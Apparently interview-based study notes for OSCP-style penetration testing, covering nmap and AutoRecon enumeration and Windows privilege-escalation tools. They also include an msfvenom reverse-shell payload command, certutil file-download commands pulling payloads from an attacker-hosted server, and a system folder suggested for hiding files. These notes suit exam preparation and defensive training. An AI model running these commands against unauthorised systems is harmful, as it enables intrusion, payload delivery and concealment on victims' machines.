# Aaron Goldstein Interview

## Enumeration

```bash
nmap $1 -F
```

### Autorecon.py

AutoRecon is the tool I used for automating the enumeration process (and OSCP exam approved)

```bash
./autorecon.py --single-target --only-scans-dir $1 -o /path/to/file
```

With `single-target`, it will only scan one target. With `only-scans-dir`, it will prevent sub-directories from being created.

### PenTest.WS

This is a great site for tracking progress against machines (can import nmap data for tracking too). I use this all the time for the Venom builder (shell creation) and other cool stuff. The free version works great.

Venom Build builds out your command for building and catching commands.

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=X.X.X.X
```

## LOLBIN

I also used a LOLBIN (Living off the Land Binary) to download files from the Windows box - the command was 

```bash
certutil -urlcache -split -f <link to file to download>
```

These are great because most systems will already have them installed.  Here is a great site that outlines TONS of them.

### Example from the Interview

After we get the file, we need to get it onto the target host.
```
python -m SimpleHTTPServer
```

This will open a server on port 8000.

```
c:\Users>certutil
```

This is a tool from Windows XP that is used to encode or decode base64. This is a Living Off the Land tool. In this case, it can also download a file from the web to encode or decode.

```
certutil -urlcache -split -f <link to file to download>
```

Another good place to hide stuff (from Justen):

```
C:\windows\system32\spool\drivers\color\
```

### Windows Privilege Escalation

A few links / tools that helped me with Windows Privesc: 

- List of pre-compiled binaries for different exploits: [Link to Github](https://github.com/abatchy17/WindowsExploits)

- WATSON: this is a tool for identifying exploits for Windows privesc - requires .NET - runs on target host
  Quick method to check what version of .NET is installed on host (needed for Watson) 
  - `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"` 

- Windows Exploit Suggester: This is a great tool for finding exploits on windows hosts for privesc too - but this one takes in the "systeminfo" from the target host and runs locally on the attacker system.

### Windows Exploits

[Link to Github](https://github.com/abatchy17/WindowsExploits)

### WATSON

[Link to WATSON Tool](https://github.com/carlospolop/winPE/tree/master/binaries/watson)
Need to find what version .NET

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

WATSON is doing the Windows Exploit Suggester locally.

### Windows Exploit Suggester

Windows Exploit Suggester, requires the systeminfo. It requires a security bulletin update.
On first run do:

```
python windows-exploit-suggester.py -u
```

```
python windows-exploit-suggester.py -i /path/to/systeminfo -d 2020-07-21-mssb.xls
```

This compares the security bulletin to the systeminfo and dump out the vulnerabilties
M = Metasploit module; E = There is a public exploit available.

Ideally, look for the older ones. Look for Critical or Important. Critical = non-privileged account to privileged.

